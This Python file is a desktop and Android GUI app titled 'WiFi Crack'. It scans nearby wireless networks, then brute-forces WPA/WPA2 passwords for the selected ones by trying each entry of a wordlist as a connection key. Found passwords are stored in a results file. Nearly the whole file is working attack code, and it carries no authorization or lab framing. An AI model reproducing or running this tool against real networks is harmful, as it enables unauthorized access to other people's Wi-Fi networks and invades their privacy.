import os
import sys
import time
import json
import platform
from datetime import datetime
from threading import Thread
from typing import List
from functools import partial
import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW, CENTER

try:
    import pywifi
    from pywifi import const
    PYWIFI_AVAILABLE = True
except ImportError:
    PYWIFI_AVAILABLE = False

if platform.system() == "Windows":
    try:
        import comtypes
    except ImportError:
        pass

DEFAULT_WORDLIST = "passwords.txt"
RESULTS_DIR = "results"
TIMEOUT_SECONDS = 15
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class Colors:
    RED = "#FF5252"
    GREEN = "#4CAF50"
    YELLOW = "#FFEB3B"
    CYAN = "#00BCD4"
    BLUE = "#2196F3"
    GRAY = "#9E9E9E"
    WHITE = "#FFFFFF"
    BLACK = "#000000"

class WiFiScanner:
    def __init__(self, status_callback):
        self.status_callback = status_callback
        self.successful_attempts = {}
        self.attempted_passwords = set()
        self.running = True
        self.scan_results = []
        self.android = "ANDROID_ARGUMENT" in os.environ
        if self.android:
            self.initialize_android_wifi()
        else:
            self.initialize_standard_wifi()
    def log(self, msg):
        if self.status_callback:
            self.status_callback(msg)
        print(msg)
    def initialize_android_wifi(self):
        try:
            from jnius import autoclass, cast
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            self.wifi_manager = cast('android.net.wifi.WifiManager', PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE))
            if not self.wifi_manager.isWifiEnabled():
                self.wifi_manager.setWifiEnabled(True)
            self.log("Android WiFi initialized.")
        except Exception as e:
            self.log("Error initializing Android WiFi: " + str(e))
            self.android = False
    def initialize_standard_wifi(self):
        if platform.system() == "Linux" and not os.path.exists("/var/run/wpa_supplicant"):
            self.log("wpa_supplicant not found.")
            return
        if not PYWIFI_AVAILABLE:
            self.log("pywifi not installed.")
            return
        try:
            self.wifi = pywifi.PyWiFi()
            interfaces = self.wifi.interfaces()
            if not interfaces:
                self.log("No wireless interfaces found!")
                return
            self.interface = interfaces[0]
            self.log("Using interface: " + self.interface.name())
            self.load_previous_attempts()
        except Exception as e:
            self.log("Error initializing WiFi: " + str(e))
    def load_previous_attempts(self):
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        if os.path.exists(success_file):
            try:
                with open(success_file, "r") as f:
                    self.successful_attempts = json.load(f)
                self.log("Loaded " + str(len(self.successful_attempts)) + " previous cracks")
            except Exception:
                self.log("Failed to load previous cracks")
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        if os.path.exists(attempts_file):
            try:
                with open(attempts_file, "r") as f:
                    for line in f:
                        if "--" in line:
                            net, pwd = line.strip().split("--", 1)
                            self.attempted_passwords.add(f"{net}--{pwd}")
                self.log("Loaded " + str(len(self.attempted_passwords)) + " attempted combinations")
            except Exception:
                self.log("Failed to load attempted combinations")
    def save_successful_attempt(self, network, password):
        self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        try:
            with open(success_file, "w") as f:
                json.dump(self.successful_attempts, f, indent=2)
        except Exception:
            self.log("Failed to save successful attempt")
    def log_attempt(self, network, password):
        attempt_key = f"{network}--{password}"
        self.attempted_passwords.add(attempt_key)
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        try:
            with open(attempts_file, "a") as f:
                f.write(attempt_key + "\n")
        except Exception:
            pass
    def scan_networks(self) -> List:
        if self.android:
            return self.scan_android_wifi()
        if not self.interface:
            self.log("No interface")
            return []
        try:
            if self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                try:
                    self.interface.disconnect()
                    time.sleep(1)
                except Exception:
                    pass
            self.interface.scan()
            wait_time = 4 if platform.system() == "Windows" else 2
            time.sleep(wait_time)
            seen = set()
            nets = []
            results = self.interface.scan_results()
            results.sort(key=lambda x: getattr(x, "signal", 0), reverse=True)
            for net in results:
                if hasattr(net, "ssid") and net.ssid and net.ssid.strip():
                    if net.ssid not in seen:
                        seen.add(net.ssid)
                        nets.append(net)
                elif hasattr(net, "bssid") and net.bssid:
                    if net.bssid not in seen:
                        seen.add(net.bssid)
                        net.ssid = f"<Hidden: {net.bssid}>"
                        nets.append(net)
            return nets
        except Exception as e:
            self.log("Error scanning: " + str(e))
            return []
    def scan_android_wifi(self):
        try:
            self.wifi_manager.startScan()
            time.sleep(4)
            results = self.wifi_manager.getScanResults()
            nets = []
            arr = results.toArray()
            for res in arr:
                ssid = res.SSID
                bssid = res.BSSID
                level = res.level
                net = type("Network", (), {})()
                net.ssid = ssid if ssid and ssid.strip() != "" else f"<Hidden: {bssid}>"
                net.signal = level
                nets.append(net)
            return nets
        except Exception as e:
            self.log("Error scanning Android: " + str(e))
            return []
    def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
        if self.android:
            self.log("Password testing not supported on Android")
            return False
        attempt_key = f"{network.ssid}--{password}"
        if attempt_key in self.attempted_passwords:
            return False
        self.log_attempt(network.ssid, password)
        try:
            profile = pywifi.Profile()
            profile.ssid = network.ssid
            profile.akm = []
            auth = [const.AUTH_ALG_OPEN]
            if hasattr(network, "akm") and network.akm:
                akm_types = network.akm
            else:
                akm_types = [const.AKM_TYPE_WPA2PSK]
                if os.name != "nt":
                    akm_types.extend([const.AKM_TYPE_WPAPSK, const.AKM_TYPE_WPA2PSK])
            profile.auth = auth[0]
            for akm in akm_types:
                profile.akm.append(akm)
            if const.AKM_TYPE_WPA2PSK in akm_types:
                profile.cipher = const.CIPHER_TYPE_CCMP
            else:
                profile.cipher = const.CIPHER_TYPE_TKIP
            profile.key = password
            try:
                self.interface.remove_all_network_profiles()
            except Exception as e:
                self.log("Warning: " + str(e))
            try:
                temp_profile = self.interface.add_network_profile(profile)
            except Exception as e:
                if "You must specify profile attributes" in str(e):
                    profile = pywifi.Profile()
                    profile.ssid = network.ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm = [const.AKM_TYPE_WPA2PSK]
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    try:
                        temp_profile = self.interface.add_network_profile(profile)
                    except Exception as inner_e:
                        self.log("Error: " + str(inner_e))
                        return False
                else:
                    self.log("Error: " + str(e))
                    return False
            try:
                self.interface.connect(temp_profile)
            except Exception as e:
                self.log("Error connecting: " + str(e))
                return False
            start = time.time()
            success = False
            while time.time() - start < timeout:
                try:
                    status = self.interface.status()
                    if status == const.IFACE_CONNECTED:
                        success = True
                        break
                    elif status == const.IFACE_DISCONNECTED:
                        break
                except Exception as e:
                    self.log("Error status: " + str(e))
                    break
                time.sleep(0.5)
            try:
                self.interface.disconnect()
            except Exception as e:
                self.log("Error disconnect: " + str(e))
            if success:
                self.log("Connected with " + password)
                time.sleep(1)
            return success
        except Exception as e:
            self.log("Error during password attempt: " + str(e))
            try:
                self.interface.disconnect()
            except Exception:
                pass
            return False
    def crack_network(self, network, passwords: List[str], progress_callback=None):
        if network.ssid in self.successful_attempts:
            self.log("Network " + network.ssid + " already cracked: " + self.successful_attempts[network.ssid]['password'])
            return True, self.successful_attempts[network.ssid]['password']
        total = len(passwords)
        for i, password in enumerate(passwords):
            if progress_callback:
                progress_callback(i+1, total, password)
            if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                continue
            self.log("Trying " + network.ssid + " with " + password + " (" + str(i+1) + "/" + str(total) + ")")
            time.sleep(1)
            if self.test_password(network, password):
                self.log("PASSWORD FOUND for " + network.ssid + ": " + password)
                self.save_successful_attempt(network.ssid, password)
                return True, password
        return False, None

class WiFiCrackApp(toga.App):
    def startup(self):
        self.main_window = toga.MainWindow(title=self.formal_name)
        self.log_view = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, font_size=16))
        self.network_table = toga.Table(headings=["SSID", "Signal", "Status", "Select"], style=Pack(flex=1))
        self.wordlist_input = toga.TextInput(value=DEFAULT_WORDLIST, style=Pack(flex=1, font_size=18))
        upload_button = toga.Button("Upload", on_press=self.open_file_chooser, style=Pack(font_size=18, background_color=Colors.CYAN))
        wordlist_box = toga.Box(children=[toga.Label("Wordlist:", style=Pack(font_size=20)), self.wordlist_input, upload_button], style=Pack(direction=ROW, padding=10, spacing=10))
        scan_button = toga.Button("Scan", on_press=self.on_scan_pressed, style=Pack(font_size=20, background_color=Colors.BLUE))
        start_button = toga.Button("Start Cracking", on_press=self.on_crack_pressed, style=Pack(font_size=20, background_color=Colors.GREEN))
        stop_button = toga.Button("Stop", on_press=self.on_stop_pressed, style=Pack(font_size=20, background_color=Colors.RED))
        self.start_button = start_button
        self.stop_button = stop_button
        header = toga.Box(children=[toga.Label("WiFi Crack", style=Pack(font_size=32, color=Colors.CYAN)), toga.Label("Ready", style=Pack(font_size=20, color=Colors.GREEN))], style=Pack(direction=ROW, padding=10, spacing=10))
        button_box = toga.Box(children=[scan_button, start_button, stop_button], style=Pack(direction=ROW, padding=10, spacing=10))
        main_box = toga.Box(children=[header, self.log_view, self.network_table, wordlist_box, button_box], style=Pack(direction=COLUMN, padding=10, spacing=10))
        self.main_window.content = main_box
        self.main_window.show()
        self.scanner = WiFiScanner(status_callback=self.log)
        self.networks = []
        self.passwords = []
        self.is_scanning = False
        self.is_cracking = False
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_view.value += "\n[" + timestamp + "] " + message
    def open_file_chooser(self, widget):
        def callback(result):
            if result:
                self.wordlist_input.value = result[0]
                self.log("Selected wordlist: " + result[0])
        toga.FileDialog.open_file(callback)
    def on_scan_pressed(self, widget):
        if self.is_scanning:
            return
        if not self.scanner or (not self.scanner.interface and not self.scanner.android):
            self.error_popup("No WiFi Interface", "No wireless interface found. Ensure WiFi is enabled.")
            return
        self.is_scanning = True
        self.log("Starting network scan...")
        self.network_table.data = []
        Thread(target=self.perform_scan).start()
    def perform_scan(self):
        nets = self.scanner.scan_networks()
        self.networks = nets
        def update_table():
            self.network_table.data = []
            for net in nets:
                row = {"SSID": net.ssid, "Signal": str(getattr(net, "signal", "N/A")), "Status": "", "Select": False}
                self.network_table.data.append(row)
            self.is_scanning = False
        self.main_window.invoke_later(update_table)
    def load_passwords(self):
        wordlist = self.wordlist_input.value
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                pwds = [line.strip() for line in f if line.strip()]
            self.log("Loaded " + str(len(pwds)) + " passwords from " + wordlist)
            return pwds
        except FileNotFoundError:
            self.error_popup("File Not Found", "Wordlist file '" + wordlist + "' not found")
            return []
        except IOError:
            self.error_popup("File Error", "Error reading wordlist file '" + wordlist + "'")
            return []
    def on_crack_pressed(self, widget):
        selected = [row for row in self.network_table.data if row["Select"]]
        if not selected:
            self.error_popup("No Network Selected", "Select at least one network to crack.")
            return
        self.passwords = self.load_passwords()
        if not self.passwords:
            return
        self.is_cracking = True
        Thread(target=self.crack_networks).start()
    def crack_networks(self):
        for row in self.network_table.data:
            if row["Select"]:
                net = next((n for n in self.networks if n.ssid == row["SSID"]), None)
                if net:
                    def progress(current, total, pwd):
                        def update():
                            row["Status"] = "Testing: " + pwd + " (" + str(current) + "/" + str(total) + ")"
                            self.network_table.refresh()
                        self.main_window.invoke_later(update)
                    result, found = self.scanner.crack_network(net, self.passwords, progress)
                    def update_status():
                        row["Status"] = "Cracked: " + found if result else "Failed"
                        self.network_table.refresh()
                    self.main_window.invoke_later(update_status)
        self.is_cracking = False
    def on_stop_pressed(self, widget):
        self.is_cracking = False
        if self.scanner:
            self.scanner.running = False
        self.start_button.enabled = True
        self.stop_button.enabled = False
        self.log("Cracking stopped by user.")
    def error_popup(self, title, message):
        dlg = toga.MessageDialog(title=title, message=message)
        dlg.show()

def main():
    return WiFiCrackApp()

if __name__ == "__main__":
    main().main_loop()